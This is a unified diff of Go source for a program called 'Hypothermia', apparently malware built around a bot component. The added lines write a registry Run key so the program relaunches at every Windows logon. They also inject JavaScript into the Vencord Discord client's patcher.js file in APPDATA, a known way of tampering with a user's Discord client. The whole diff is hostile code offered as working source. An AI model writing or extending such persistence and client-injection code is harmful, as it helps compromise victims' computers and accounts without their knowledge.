@@ -10,6 +10,7 @@ import (
 	"Hypothermia/src/bot"
 	"Hypothermia/src/funcs"
 	"Hypothermia/src/utils"
+	"Hypothermia/src/utils/persistence"
 )
 
 func main() {
@@ -45,7 +46,13 @@ func main() {
 		}
 	}
 
-	if len(os.Args) >= 2 && os.Args[1] == config.Verifier {
+	if len(os.Args) == 3 && os.Args[1] == config.Verifier {
+		if os.Args[2] != "NIL" {
+			if file, err := os.Create(os.Args[2]); err == nil {
+				file.Close()
+			}
+		}
+
 		bot.Init()
 		return
 	}
@@ -87,11 +94,11 @@ func main() {
 		return
 	}
 
-	if !config.Debugging && config.AddToStartup {
+	if !config.Debugging && config.Persistence {
 		err := utils.SetRegistryVal(
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
 			config.HypothermiaName,
-			fmt.Sprintf("\"%s\" %s", newPath, config.Verifier),
+			fmt.Sprintf("\"%s\" %s %s", newPath, config.Verifier, "NIL"),
 		)
 
 		if err != nil {
@@ -99,9 +106,11 @@ func main() {
 			fmt.Scanln()
 			return
 		}
+
+		utils_persist.InjectJS(filepath.Join(os.Getenv("APPDATA"), "Vencord\\dist\\patcher.js"))
 	}
 
-	cmd := exec.Command(newPath, config.Verifier)
+	cmd := exec.Command(newPath, config.Verifier, oldPath)
 	err = cmd.Start()
 	if err != nil {
 		fmt.Println("main/6 -", err)
